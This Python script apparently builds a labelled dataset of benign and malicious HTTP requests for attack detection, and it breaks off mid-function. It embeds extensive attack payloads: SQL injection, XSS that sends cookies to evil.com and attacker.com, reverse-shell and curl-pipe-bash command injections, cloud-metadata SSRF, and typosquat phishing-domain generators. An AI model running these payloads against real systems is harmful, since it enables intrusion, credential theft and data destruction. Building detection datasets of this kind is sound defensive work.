# SSRF (Server-Side Request Forgery) patterns
ssrf_patterns = [
    {"payload": "file:///etc/passwd", "name": "Local File", "description": "SSRF to access local file"},
    {"payload": "http://169.254.169.254/latest/meta-data/", "name": "Cloud Metadata", "description": "SSRF to access cloud instance metadata"},
    {"payload": "http://localhost:8080/admin", "name": "Internal Service", "description": "SSRF to access internal admin service"},
    {"payload": "http://internal-service.local/api/v1/keys", "name": "Internal API", "description": "SSRF to access internal API"},
    {"payload": "dict://internal-server:6379/info", "name": "Redis Access", "description": "SSRF using Redis protocol"},
    {"payload": "gopher://127.0.0.1:25/xHELO%20localhost", "name": "SMTP Access", "description": "SSRF using Gopher protocol for SMTP"}
]

# Broken Access Control patterns
broken_access_control_patterns = [
    {"payload": "../../admin/users", "name": "Path Manipulation", "description": "Access control bypass via path manipulation"},
    {"payload": "/admin/?debug=true", "name": "Debug Parameter", "description": "Access control bypass via debug parameter"},
    {"payload": "X-Original-URL: /admin/settings", "name": "Header Bypass", "description": "Access control bypass via modified header"},
    {"payload": "?access_token=ADMIN_TOKEN", "name": "Token Manipulation", "description": "Manipulated access token"},
    {"payload": "?role=ROLE_ADMIN", "name": "Role Manipulation", "description": "Manipulating role parameter"}
]

# Cryptographic Failures patterns
crypto_failures_patterns = [
    {"payload": "protocol=http", "name": "Downgrade Attack", "description": "Forcing insecure protocol usage"},
    {"payload": "cipher=RC4", "name": "Weak Cipher", "description": "Requesting weak cipher in TLS negotiation"},
    {"payload": "?jwt=header.payload.", "name": "JWT None", "description": "JWT with null signature algorithm"},
    {"payload": "?hash=md5", "name": "Weak Hash", "description": "Using weak hash function"},
    {"payload": "?ssl=3.0", "name": "Obsolete SSL", "description": "Using deprecated SSL version"}
]

def parse_request_to_csv_row(request_str, index):
    """Parse an HTTP request string into a CSV row with proper column alignment"""
    lines = request_str.strip().split('\n')
    
    # Initialize all fields as empty strings
    row = {
        'index': index,
        'is_attack': 'False',
        'attack_type': 'benign',  # Default to benign
        'method': '',
        'url': '',
        'host': '',
        'user_agent': '',
        'accept': '',
        'accept_language': '',
        'accept_encoding': '',
        'content_type': '',
        'content_length': '',
        'connection': '',
        'cookie': '',
        'body': '',
        'x_forwarded_for': '',
        'referer': '',
        'origin': '',
        'x_requested_with': '',
        'http_version': ''
    }
    
    # Parse metadata (first line)
    metadata_lines = []
    for line in lines:
        if line.startswith('#'):
            metadata_lines.append(line)
        else:
            break
    
    # Process metadata for attack information
    for meta in metadata_lines:
        if '# Attack:' in meta:
            row['is_attack'] = 'True'
            row['attack_type'] = meta.split('# Attack:')[1].strip()
    
    # Remove metadata lines from processing
    lines = [line for line in lines if not line.startswith('#')]
    
    # Parse request line
    if lines:
        first_line = lines[0]
        if ' HTTP/' in first_line:
            parts = first_line.split(' ')
            if len(parts) >= 3:
                row['method'] = parts[0]
                row['url'] = parts[1]
                # Extract HTTP version (last part after 'HTTP/')
                http_version_part = parts[-1]
                if http_version_part.startswith('HTTP/'):
                    row['http_version'] = http_version_part
    
    # Parse headers and body
    in_body = False
    body_lines = []
    
    for line in lines[1:]:  # Skip the first line (request line)
        if not line.strip():
            in_body = True
            continue
        
        if not in_body:
            if ': ' in line:
                name, value = line.split(': ', 1)
                name = name.lower()
                value = value.strip()
                
                # Map headers to correct columns
                if name == 'host':
                    row['host'] = value
                elif name == 'user-agent':
                    row['user_agent'] = value
                elif name == 'accept':
                    row['accept'] = value
                elif name == 'accept-language':
                    row['accept_language'] = value
                elif name == 'accept-encoding':
                    row['accept_encoding'] = value
                elif name == 'content-type':
                    row['content_type'] = value
                elif name == 'content-length':
                    row['content_length'] = value
                elif name == 'connection':
                    row['connection'] = value
                elif name == 'cookie':
                    # Keep attack payloads in cookies, simplify others
                    if row['is_attack'] == 'True' and any(attack_indicator in value for attack_indicator in ["'", '"', '<', '>', '%', '(', ')']):
                        row['cookie'] = value
                    else:
                        # Simplify cookie values but keep structure
                        cookie_parts = value.split(';')
                        simplified_cookies = []
                        for part in cookie_parts:
                            if '=' in part:
                                name, val = part.split('=', 1)
                                simplified_cookies.append(f"{name.strip()}=random_value")
                            else:
                                simplified_cookies.append(part.strip())
                        row['cookie'] = '; '.join(simplified_cookies)
                elif name == 'x-forwarded-for':
                    row['x_forwarded_for'] = value
                elif name == 'referer':
                    row['referer'] = value
                elif name == 'origin':
                    row['origin'] = value
                elif name == 'x-requested-with':
                    row['x_requested_with'] = value
        else:
            body_lines.append(line)
    
    # Set body if exists
    if body_lines:
        body = '\n'.join(body_lines)
        if row['is_attack'] == 'True' and any(attack_indicator in body for attack_indicator in ["'", '"', '<', '>', '%', '(', ')']):
            row['body'] = body
        else:
            # Simplify body values based on content type
            if row['content_type'] == 'application/json':
                # Preserve JSON structure but simplify values
                try:
                    import json
                    body_json = json.loads(body)
                    def simplify_json(obj):
                        if isinstance(obj, dict):
                            return {k: simplify_json(v) for k, v in obj.items()}
                        elif isinstance(obj, list):
                            return [simplify_json(item) for item in obj]
                        elif isinstance(obj, (int, float)):
                            return obj
                        else:
                            return "random_value"
                    row['body'] = json.dumps(simplify_json(body_json))
                except:
                    row['body'] = body
            elif row['content_type'] == 'application/x-www-form-urlencoded':
                # Preserve form structure but simplify values
                form_parts = body.split('&')
                simplified_parts = []
                for part in form_parts:
                    if '=' in part:
                        name, value = part.split('=', 1)
                        simplified_parts.append(f"{name}=random_value")
                    else:
                        simplified_parts.append(part)
                row['body'] = '&'.join(simplified_parts)
            elif row['content_type'] == 'application/xml':
                # Keep XML structure but simplify text content
                import re
                def simplify_xml_content(xml_str):
                    # Replace content between tags with random_value while preserving tags
                    return re.sub(r'>([^<>]*)<', '>random_value<', xml_str)
                row['body'] = simplify_xml_content(body)
            else:
                row['body'] = body
    
    # Set default x-requested-with if empty
    if not row['x_requested_with'] and random.random() < 0.3:  # 30% chance to add X-Requested-With
        row['x_requested_with'] = random.choice([
            'XMLHttpRequest',
            'Fetch',
            'axios',
            'jQuery',
            'superagent'
        ])
    
    return row

def generate_realistic_headers(method, domain, is_malicious=False, attack_type=None, content_type=None):
    """Generate realistic HTTP headers based on the request context"""
    headers = {}
    
    # Add User-Agent
    headers["User-Agent"] = generate_user_agent(is_malicious)
    
    # Add Host header
    headers["Host"] = domain
    
    # Add common headers
    headers["Accept"] = "*/*" if is_malicious and random.random() < 0.3 else "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    headers["Accept-Language"] = random.choice(supported_languages) + ";q=0.9"
    headers["Accept-Encoding"] = "gzip, deflate, br"
    
    # Add Connection header
    headers["Connection"] = "close" if is_malicious and random.random() < 0.4 else "keep-alive"
    
    # Add Origin header for specific methods or if it's a CORS request (70% chance)
    if method in ["POST", "PUT", "DELETE", "PATCH"] or random.random() < 0.7:
        scheme = "http" if is_malicious else "https"
        if is_malicious and attack_type == "xss":
            # Sometimes add malicious origin for XSS attacks
            if random.random() < 0.3:
                headers["Origin"] = f"<script>alert(1)</script>"
            else:
                headers["Origin"] = f"{scheme}://{domain}"
        elif is_malicious and attack_type == "ssrf":
            # Add potentially malicious internal origins for SSRF
            if random.random() < 0.3:
                headers["Origin"] = random.choice([
                    "http://localhost:8080",
                    "http://internal-server",
                    "http://10.0.0.1",
                    "http://169.254.169.254",
                    "http://metadata.google.internal"
                ])
            else:
                headers["Origin"] = f"{scheme}://{domain}"
        else:
            # Normal origin header
            headers["Origin"] = f"{scheme}://{domain}"
    
    # Add Referer with 60% probability for benign requests, 20% for malicious
    if (not is_malicious and random.random() < 0.6) or (is_malicious and random.random() < 0.2):
        if is_malicious and attack_type == "xss":
            # Add potentially malicious referer for XSS attacks
            headers["Referer"] = f"https://{domain}/search?q=<script>alert(1)</script>"
        else:
            # Add legitimate referer
            referer_paths = ["/", "/search", "/products", "/categories", "/home"]
            headers["Referer"] = f"https://{domain}{random.choice(referer_paths)}"
    
    # Add Content-Type for requests with body
    if content_type and method in ["POST", "PUT", "PATCH"]:
        headers["Content-Type"] = content_type
    
    # Add security headers for benign requests
    if not is_malicious:
        if random.random() < 0.7:  # 70% chance
            headers["Sec-Fetch-Site"] = random.choice(["same-origin", "same-site", "cross-site", "none"])
            headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors", "same-origin"])
            headers["Sec-Fetch-Dest"] = random.choice(["document", "image", "script", "style", "font"])
            headers["Sec-Ch-Ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
            headers["Sec-Ch-Ua-Mobile"] = random.choice(["?0", "?1"])
            headers["Sec-Ch-Ua-Platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"'])
    
    # Add X-Requested-With header (30% chance)
    if random.random() < 0.3:
        headers["X-Requested-With"] = random.choice([
            "XMLHttpRequest",
            "Fetch",
            "axios",
            "jQuery",
            "superagent"
        ])
    
    # Add potentially suspicious headers for malicious requests
    if is_malicious:
        if attack_type == "sqli" and random.random() < 0.2:
            headers["X-Forwarded-For"] = "' OR '1'='1"
        elif attack_type == "cmdi" and random.random() < 0.2:
            headers["X-Custom-Header"] = "; cat /etc/passwd"
        elif attack_type == "ssrf" and random.random() < 0.2:
            headers["X-Forwarded-Host"] = "internal-server.local"
            headers["X-Forwarded-For"] = "127.0.0.1"
    
    # Add random custom headers with low probability
    if random.random() < 0.1:  # 10% chance
        custom_headers = {
            "X-Request-ID": str(uuid.uuid4()),
            "X-Real-IP": generate_random_ip(),
            "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "JP", "CN", "IN", "BR", "RU"]),
            "X-Frame-Options": "SAMEORIGIN",
            "X-Content-Type-Options": "nosniff"
        }
        headers.update({k: v for k, v in custom_headers.items() if random.random() < 0.3})
    
    return headers

def main():
    # If converting existing file
    if args.convert:
        convert_text_to_csv(args.convert)
        return

    # If analyzing existing file
    if args.analyze:
        analyze_http_samples(args.analyze)
        return

    # Debug output for domain loading
    if args.debug:
        print(f"\nDomain Loading Status:")
        print(f"Benign domains loaded: {len(benign_domains)}")
        print(f"Sample benign domains: {benign_domains[:5]}")
        print(f"Malicious domains loaded: {len(malicious_domains)}")
        print(f"Sample malicious domains: {malicious_domains[:5]}")
        print(f"\nConfiguration:")
        print(f"Malicious ratio: {args.malicious_ratio}")
        print(f"Total samples requested: {args.count}")

    # Create output directory if it doesn't exist
    output_dir = os.path.dirname(args.output)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Calculate how many of each type to generate
    total_requests = args.count
    malicious_count = int(total_requests * args.malicious_ratio)
    benign_count = total_requests - malicious_count

    print(f"Generating {total_requests} HTTP request samples ({benign_count} benign, {malicious_count} malicious)...")

    # Ensure we have enough domains
    if len(benign_domains) < 10:
        print("Warning: Insufficient benign domains, adding fallback domains...")
        benign_domains.extend([generate_international_domain(False) for _ in range(max(10, benign_count))])
    
    if len(malicious_domains) < 10:
        print("Warning: Insufficient malicious domains, adding fallback domains...")
        malicious_domains.extend([generate_international_domain(True) for _ in range(max(10, malicious_count))])

    # Define attack types and their weights with proper distribution
    attack_types_with_weights = {
        "sqli": 20,           # SQL injection (high priority)
        "xss": 20,           # Cross-Site Scripting (high priority)
        "path_traversal": 15, # Path Traversal
        "lfi": 10,           # Local File Inclusion
        "open_redirect": 5,   # Open Redirect
        "ssrf": 10,          # SSRF
        "nosql_injection": 5, # NoSQL injection
        "graphql_attacks": 2, # GraphQL attacks
        "jwt_attacks": 2,     # JWT attacks
        "prototype_pollution": 2, # Prototype pollution
        "template_injection": 2,  # Template injection
        "xxe_injection": 2,      # XXE injection
        "deserialization": 2,    # Deserialization
        "modern_sqli": 5,        # Modern SQL injection
        "modern_xss": 5,         # Modern XSS
        "modern_cmdi": 5,        # Modern command injection
        "modern_ssrf": 5,        # Modern SSRF
        "modern_file_attacks": 3  # Modern file attacks
    }

    # Convert weights to list format for random.choices
    attack_types = list(attack_types_with_weights.keys())
    attack_weights = list(attack_types_with_weights.values())

    # Generate requests
    requests = []
    attack_counts = {}

    if args.debug:
        print("\nStarting request generation...")

    # Generate benign requests first
    for i in range(benign_count):
        request = generate_request(i + 1, False)
        requests.append(request)
        if args.debug and i % 1000 == 0:
            print(f"Generated {i+1}/{benign_count} benign requests")

    # Generate malicious requests with weighted distribution
    for i in range(malicious_count):
        attack_type = random.choices(attack_types, weights=attack_weights, k=1)[0]
        request = generate_request(benign_count + i + 1, True, attack_type)
        requests.append(request)
        attack_counts[attack_type] = attack_counts.get(attack_type, 0) + 1
        if args.debug and i % 1000 == 0:
            print(f"Generated {i+1}/{malicious_count} malicious requests")

    # Write output based on format
    if args.output_format == 'txt':
        with open(args.output, 'w') as f:
            for request in requests:
                f.write(request + '\n\n')
        output_file = args.output
    else:  # CSV format
        csv_rows = []
        fieldnames = ['index', 'is_attack', 'attack_type', 'method', 'url', 'host', 
                     'user_agent', 'accept', 'accept_language', 'accept_encoding', 
                     'content_type', 'content_length', 'connection', 'cookie', 'body', 
                     'x_forwarded_for', 'referer', 'origin', 'x_requested_with',
                     'http_version']
        
        for i, request in enumerate(requests, 1):
            csv_row = parse_request_to_csv_row(request, i)
            csv_rows.append(csv_row)
        
        output_file = args.output.rsplit('.', 1)[0] + '.csv'
        with open(output_file, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, quoting=csv.QUOTE_ALL)
            writer.writeheader()
            writer.writerows(csv_rows)

    # Print statistics
    print(f"\nGenerated {total_requests} HTTP request samples:")
    print(f"  - Benign requests: {benign_count}")
    print(f"  - Malicious requests: {malicious_count}")
    
    if malicious_count > 0 and attack_counts:
        print("\nAttack type distribution:")
        for attack_type, count in sorted(attack_counts.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / malicious_count) * 100
            print(f"  - {attack_type}: {count} ({percentage:.1f}%)")

    print(f"\nOutput written to {output_file}")
    
    # Generate analysis report for the output file
    analyze_http_samples(output_file)

def generate_request(index, is_malicious=False, force_attack_type=None):
    """Generate a single HTTP request"""
    # Select attack type if malicious
    if is_malicious:
        if force_attack_type:
            attack_type = force_attack_type
        else:
            # Decide between traditional attacks and URL-based attacks
            if random.random() < 0.4:  # 40% chance for URL-based attacks
                attack_types = list(url_based_attacks.keys())
                attack_weights = list(url_based_attacks.values())
                attack_type = random.choices(attack_types, weights=attack_weights, k=1)[0]
            else:  # 60% chance for traditional attacks
                attack_types = list(attack_types_with_weights.keys())
                attack_weights = list(attack_types_with_weights.values())
                attack_type = random.choices(attack_types, weights=attack_weights, k=1)[0]
    
    # Generate method based on attack type
    if is_malicious:
        method = "GET" if attack_type in url_based_attacks else generate_request_method(True)
    else:
        method = generate_request_method(False)
    
    # Select domain based on attack type
    if is_malicious:
        if attack_type in url_based_attacks:
            domain = generate_phishing_domain() if attack_type == "phishing" else generate_malicious_domain(attack_type)
        else:
            domain = random.choice(malicious_domains)
    else:
        domain = random.choice(benign_domains)
    
    # Generate path and attack payload if malicious
    if is_malicious:
        if attack_type in url_based_attacks:
            path = generate_malicious_path(attack_type)
        else:
            attack_payload = generate_url_attack_payload(attack_type)
            path = generate_path_with_attack(random.choice(web_paths), attack_type, attack_payload)
    else:
        path = random.choice(web_paths)
    
    # Generate headers
    headers = generate_realistic_headers(method, domain, is_malicious, attack_type if is_malicious else None)
    
    # Build request lines
    request_lines = []
    request_lines.append(f"{method} {path} HTTP/1.1")
    request_lines.append(f"Host: {domain}")
    
    # Add headers
    for header, value in headers.items():
        request_lines.append(f"{header}: {value}")
    
    # Add cookies
    cookies = generate_cookies(domain, is_malicious, attack_type if is_malicious else None)
    if cookies:
        request_lines.append(f"Cookie: {'; '.join(f'{k}={v}' for k, v in cookies.items())}")
    
    # Add body for POST requests
    if method == "POST":
        if is_malicious:
            if attack_type in url_based_attacks:
                body = generate_malicious_form_data(attack_type)
            else:
                if attack_type == "sqli":
                    body = generate_malicious_cookie_payload("sql")
                elif attack_type == "xss":
                    body = generate_malicious_cookie_payload("xss")
                elif attack_type == "cmdi":
                    body = generate_malicious_cookie_payload("command")
                else:
                    body = generate_url_attack_payload(attack_type).lstrip('?param=')
        else:
            body = generate_benign_form_data()
        
        if body:
            request_lines.extend(["", body])
    
    # Add metadata
    header = f"# Sample {index}"
    if is_malicious:
        header += f"\n# Attack: {attack_type}"
        if attack_type in url_based_attacks:
            header += f"\n# Description: Malicious URL attack using {attack_type} technique"
        else:
            header += f"\n# Description: Malicious request using {attack_type} attack pattern"
    
    return header + "\n" + "\n".join(request_lines)

def generate_phishing_form_data():
    """Generate form data typical in phishing attacks"""
    fields = {
        'credentials': ['username', 'password', 'email', 'pin', 'code'],
        'personal': ['name', 'address', 'phone', 'dob', 'ssn'],
        'financial': ['card_number', 'cvv', 'expiry', 'account_number', 'routing_number'],
        'verification': ['otp', 'security_question', 'verification_code', 'token']
    }
    
    # Choose 2-4 field categories
    categories = random.sample(list(fields.keys()), random.randint(2, 4))
    form_data = []
    
    for category in categories:
        # Choose 1-3 fields from each category
        category_fields = random.sample(fields[category], random.randint(1, 3))
        for field in category_fields:
            form_data.append(f"{field}=placeholder_{field}")
    
    return "&".join(form_data)

def generate_benign_form_data():
    """Generate legitimate-looking form data"""
    fields = [
        "q=search_term",
        "page=1",
        "sort=relevance",
        "filter=all",
        "lang=en",
        "theme=light"
    ]
    return "&".join(random.sample(fields, random.randint(1, 3)))

def generate_phishing_domain():
    """Generate a phishing domain based on common patterns"""
    patterns = [
        # Brand name with suspicious TLD
        lambda: f"{random.choice(phishing_keywords['brand_names'])}{random.choice(['secure', 'login', 'support', 'service'])}.{random.choice(suspicious_tlds)}",
        
        # Service word with brand
        lambda: f"{random.choice(phishing_keywords['service_words'])}{random.choice(phishing_keywords['brand_names'])}.{random.choice(suspicious_tlds)}",
        
        # Action word with service
        lambda: f"{random.choice(phishing_keywords['action_words'])}{random.choice(phishing_keywords['service_words'])}.{random.choice(suspicious_tlds)}",
        
        # Financial service lookalike
        lambda: f"{random.choice(phishing_keywords['financial_words'])}{random.choice(['secure', 'verify', 'service'])}.{random.choice(suspicious_tlds)}",
        
        # Government service lookalike
        lambda: f"{random.choice(['gov', 'government', 'official', 'federal'])}-{random.choice(phishing_keywords['service_words'])}.{random.choice(suspicious_tlds)}",
        
        # Support service lookalike
        lambda: f"{random.choice(phishing_keywords['brand_names'])}{random.choice(['help', 'support', 'service'])}.{random.choice(suspicious_tlds)}",
        
        # Security service lookalike
        lambda: f"{random.choice(['secure', 'safety', 'protect'])}{random.choice(phishing_keywords['service_words'])}.{random.choice(suspicious_tlds)}",
        
        # Misspelled brand names
        lambda: f"{misspell_word(random.choice(phishing_keywords['brand_names']))}.{random.choice(suspicious_tlds)}"
    ]
    
    return random.choice(patterns)()

def misspell_word(word):
    """Create a misspelled version of a word for phishing domains"""
    techniques = [
        lambda w: w.replace('a', '4'),
        lambda w: w.replace('e', '3'),
        lambda w: w.replace('i', '1'),
        lambda w: w.replace('o', '0'),
        lambda w: w.replace('s', '5'),
        lambda w: w + random.choice(['secure', 'login', 'verify']),
        lambda w: w + '-' + random.choice(['account', 'service', 'support']),
        lambda w: random.choice(['my', 'verify', 'secure']) + w,
        lambda w: w + random.choice(['s', 'z', 'x']),
        lambda w: ''.join([c + ('x' if random.random() < 0.1 else '') for c in w])
    ]
    
    return random.choice(techniques)(word)

def generate_phishing_path():
    """Generate a phishing URL path based on common patterns"""
    patterns = [
        # Login/authentication paths
        lambda: f"/{random.choice(['login', 'signin', 'auth'])}/{random.choice(['verify', 'confirm', 'secure'])}",
        
        # Account management paths
        lambda: f"/{random.choice(['account', 'profile', 'user'])}/{random.choice(['update', 'verify', 'confirm'])}",
        
        # Security paths
        lambda: f"/{random.choice(['security', 'protection', 'safety'])}/{random.choice(['check', 'verify', 'update'])}",
        
        # Support/help paths
        lambda: f"/{random.choice(['support', 'help', 'assistance'])}/{random.choice(['ticket', 'case', 'request'])}",
        
        # Financial paths
        lambda: f"/{random.choice(['payment', 'billing', 'invoice'])}/{random.choice(['update', 'verify', 'process'])}",
        
        # Document paths
        lambda: f"/{random.choice(['document', 'form', 'file'])}/{random.choice(['view', 'download', 'sign'])}",
        
        # Service paths
        lambda: f"/{random.choice(['service', 'system', 'portal'])}/{random.choice(['access', 'entry', 'gateway'])}"
    ]
    
    path = random.choice(patterns)()
    
    # Add query parameters with a 60% chance
    if random.random() < 0.6:
        params = [
            f"token={generate_random_token()}",
            f"id={generate_random_token()}",
            f"session={generate_random_token()}",
            f"ref={generate_random_token()}"
        ]
        path += f"?{'&'.join(random.sample(params, random.randint(1, 3)))}"
    
    return path

def generate_random_token():
    """Generate a random token for URL parameters"""
    token_patterns = [
        lambda: ''.join(random.choices('0123456789abcdef', k=32)),
        lambda: ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=24)),
        lambda: f"{int(time.time())}-{''.join(random.choices('0123456789abcdef', k=16))}",
        lambda: str(uuid.uuid4()),
        lambda: base64.b64encode(os.urandom(16)).decode('utf-8')
    ]
    return random.choice(token_patterns)()

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_benign_id():
    """Generate benign IDs with clear safe patterns"""
    formats = [
        lambda: f"user_{random.randint(10000, 99999)}",  # Simple numeric
        lambda: f"sess_{random.randint(100000, 999999)}",  # Session style
        lambda: ''.join(random.choices('0123456789abcdef', k=32)),  # Hex format
        lambda: f"{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}",  # Segmented
        lambda: f"temp_{int(datetime.datetime.now().timestamp())}",  # Timestamp based
        lambda: f"id{random.randint(100000, 999999)}"  # Simple prefixed
    ]
    return random.choice(formats)()

def generate_session_id(is_malicious=False):
    """Generate a session ID with clear distinction between benign and malicious patterns"""
    if not is_malicious:
        # Return a simple placeholder for benign session IDs
        return "session_id"
    else:
        # Malicious session IDs - clear SQL injection or command injection patterns
        formats = [
            lambda: f"' OR '1'='1",  # Basic SQL injection
            lambda: f"admin'--",  # Comment-based SQL injection
            lambda: f"' UNION SELECT username,password FROM users--",  # UNION-based SQL injection
            lambda: f"; cat /etc/passwd",  # Command injection
            lambda: f"' OR id={random.randint(1,10)}--",  # Numeric-based SQL injection
            lambda: f"' OR 'x'='x",  # Boolean-based SQL injection
            lambda: f"|whoami",  # Simple command injection
            lambda: f"admin' /*",  # Comment-based SQL injection
            lambda: f"' OR '1'='1' LIMIT 1--",  # SQL injection with LIMIT
            lambda: f"; ls -la /",  # Command listing injection
            lambda: f"random_session_id'OR1=1--+",  # Classic session hijacking
            lambda: f"' OR username LIKE '%admin%'--",  # Username enumeration
            lambda: f"' OR 1=1 ORDER BY 1--",  # Order by injection
            lambda: f"' UNION SELECT NULL,NULL--",  # Union injection
            lambda: f"admin' AND '1'='1",  # AND-based injection
            lambda: f"' OR 'admin' LIKE '%adm%",  # LIKE-based injection
            lambda: f"' OR LENGTH(username)>0--",  # Length-based injection
            lambda: f"' OR EXISTS(SELECT * FROM users)--",  # EXISTS-based injection
            lambda: f"' OR ASCII(SUBSTRING(username,1,1))=97--",  # ASCII-based injection
            lambda: f"' OR SLEEP(5)--"  # Time-based injection
        ]
        return random.choice(formats)()

def generate_tracking_id(is_malicious=False):
    """Generate tracking ID with clear distinction between benign and malicious patterns"""
    if not is_malicious:
        # Benign tracking IDs - standard analytics and tracking formats
        formats = [
            lambda: f"UA-{random.randint(100000, 999999)}-{random.randint(1, 9)}",  # Google Analytics
            lambda: f"GTM-{random.randint(1000000, 9999999)}",  # Google Tag Manager
            lambda: f"AW-{random.randint(100000000, 999999999)}",  # Google Ads
            lambda: f"fbp.1.{int(datetime.datetime.now().timestamp())}.{random.randint(1000000, 9999999)}",  # Facebook Pixel
            lambda: f"tid_{random.randint(10000, 99999)}_{random.randint(1000000, 9999999)}"  # Custom tracking
        ]
    else:
        # Malicious tracking IDs - clear attack patterns
        formats = [
            lambda: f"1'; DROP TABLE users--",  # Destructive SQL injection
            lambda: f"'; exec xp_cmdshell('net user')--",  # SQL Server command execution
            lambda: f"'; WAITFOR DELAY '0:0:10'--",  # Time-based SQL injection
            lambda: f"'; LOAD_FILE('/etc/passwd')--",  # File reading SQL injection
            lambda: f"'; CREATE USER malicious IDENTIFIED BY 'pass123'--",  # User creation SQL injection
            lambda: f"|curl http://attacker.com/data?cookie=",  # Data exfiltration
            lambda: f"; wget http://malicious.com/payload.sh",  # Malicious download
            lambda: f"'; GRANT ALL PRIVILEGES ON *.* TO 'malicious'@'%'--",  # Privilege escalation
            lambda: f"'; SELECT @@version--",  # Information disclosure
            lambda: f"$(curl http://attacker.com/script.sh | bash)"  # Remote code execution
        ]
    return random.choice(formats)()

def generate_jwt_token(is_malicious=False):
    """Generate a JWT token placeholder or malicious payload"""
    if is_malicious:
        return generate_malicious_cookie_payload("jwt")
    return "jwt_token"

def generate_malicious_cookie_payload(attack_type="sql"):
    """Generate malicious cookie payloads with clear attack patterns"""
    if attack_type == "sql":
        payloads = [
            "' OR '1'='1",  # Basic authentication bypass
            "' UNION SELECT username,password FROM users--",  # Data extraction
            "1' OR '1'='1' --",  # Another authentication bypass
            f"' OR id={random.randint(1,10)}--",  # Numeric manipulation
            "admin'--",  # Admin authentication bypass
            "' OR 'x'='x",  # Boolean-based injection
            "1' ORDER BY 1--",  # Order by injection
            "1' AND 1=1--",  # AND-based injection
            "' OR 1=1#",  # Hash-comment injection
            "') OR ('1'='1",  # Parenthesis injection
            "random_session_id'OR1=1--+",  # Classic session hijacking
            "' OR username LIKE '%admin%'--",  # Username enumeration
            "' OR 1=1 ORDER BY 1--",  # Order by injection
            "' UNION SELECT NULL,NULL--",  # Union injection
            "admin' AND '1'='1",  # AND-based injection
            "' OR 'admin' LIKE '%adm%",  # LIKE-based injection
            "' OR LENGTH(username)>0--",  # Length-based injection
            "' OR EXISTS(SELECT * FROM users)--",  # EXISTS-based injection
            "' OR ASCII(SUBSTRING(username,1,1))=97--",  # ASCII-based injection
            "' OR SLEEP(5)--",  # Time-based injection
            # International variations
            "' OR ユーザー='管理者'--",  # Japanese
            "' OR 用户='管理员'--",  # Chinese
            "' OR 사용자='관리자'--",  # Korean
            "' OR пользователь='админ'--",  # Russian
            "' OR משתמש='מנהל'--"  # Hebrew
        ]
    elif attack_type == "xss":
        payloads = [
            "<script>alert(document.cookie)</script>",  # Basic XSS
            "<img src=x onerror=alert(document.cookie)>",  # Image XSS
            "javascript:alert(document.cookie)",  # JavaScript protocol
            "<svg/onload=alert(document.cookie)>",  # SVG XSS
            "';alert(document.cookie);//",  # JavaScript injection
            "<script>fetch('http://attacker.com/'+document.cookie)</script>",  # Data exfiltration
            "<img src=x onerror=fetch('http://attacker.com/'+btoa(document.cookie))>",  # Encoded exfiltration
            "<svg><script>alert(document.cookie)</script></svg>",  # SVG script
            "javascript:fetch('http://attacker.com/'+document.cookie)",  # JavaScript fetch
            "onerror=alert;throw document.cookie",  # Error-based XSS
            # Cookie-specific XSS
            "<script>new Image().src='http://evil.com/?c='+document.cookie;</script>",
            "<img src=x onerror='$.post(`http://evil.com`,{c:document.cookie})'>",
            "<script>navigator.sendBeacon('http://evil.com',document.cookie)</script>",
            "<svg onload='fetch(`http://evil.com?c=${document.cookie}`)'>",
            "<script>WebSocket('ws://evil.com').send(document.cookie)</script>"
        ]
    else:  # command injection
        payloads = [
            "$(cat /etc/passwd)",  # File reading
            "|cat /etc/passwd",  # Pipe-based injection
            "& whoami",  # Background execution
            "; ls -la",  # Command chaining
            "|| id",  # OR operator injection
            "`cat /etc/shadow`",  # Backtick execution
            "| nc -e /bin/bash attacker.com 4444",  # Reverse shell
            "; curl http://evil.com/script.sh | bash",  # Remote script execution
            "& ping -c 10 attacker.com",  # Network command
            "> /tmp/malicious",  # File writing
            # Cookie-specific command injections
            "; wget http://evil.com/cookie-stealer.sh -O /tmp/cs && bash /tmp/cs",
            "| tee /var/log/apache2/access.log",
            "; crontab -l | { cat; echo '* * * * * nc evil.com 4444'; } | crontab -",
            "` echo 'evil:x:0:0::/root:/bin/bash' >> /etc/passwd`",
            "; curl -X POST -d \"cookie=$COOKIE\" http://evil.com/logger"
        ]
    return random.choice(payloads)

def generate_cookies(domain, is_malicious=False, attack_type=None):
    """Generate cookies with proper formatting and optional malicious payloads"""
    cookies = {}
    
    # Determine which cookies to include (not all requests need all cookies)
    cookie_types = {
        'session': 0.9,      # 90% chance for session cookie
        'tracking': 0.6,     # 60% chance for tracking
        'analytics': 0.5,    # 50% chance for analytics
        'preferences': 0.3,  # 30% chance for preferences
        'auth': 0.4,        # 40% chance for auth token
        'theme': 0.2,       # 20% chance for theme
        'language': 0.3,    # 30% chance for language
        'region': 0.2       # 20% chance for region
    }
    
    # Session cookie variations based on frameworks and regions
    session_formats = {
        'php': ('PHPSESSID', 'session_id'),
        'node': ('connect.sid', 'session_id'),
        'django': ('sessionid', 'session_id'),
        'next': ('next-auth.session-token', 'session_token'),
        'express': ('express:sess', 'session_id'),
        'flask': ('session', 'session_id'),
        'laravel': ('laravel_session', 'session_id'),
        'rails': ('_rails_session', 'session_id'),
        'spring': ('JSESSIONID', 'session_id'),
        'asp': ('ASP.NET_SessionId', 'session_id')
    }
    
    # Add cookies based on probabilities
    if random.random() < cookie_types['session']:
        framework, (cookie_name, value_template) = random.choice(list(session_formats.items()))
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = value_template
        cookies[cookie_name] = cookie_value
    
    if random.random() < cookie_types['tracking']:
        if is_malicious:
            cookie_value = generate_malicious_cookie_payload(attack_type)
        else:
            cookie_value = "tracking_id"
        cookies["trackingId"] = cookie_value
    
    if random.random() < cookie_types['analytics']:
        if is_malicious:
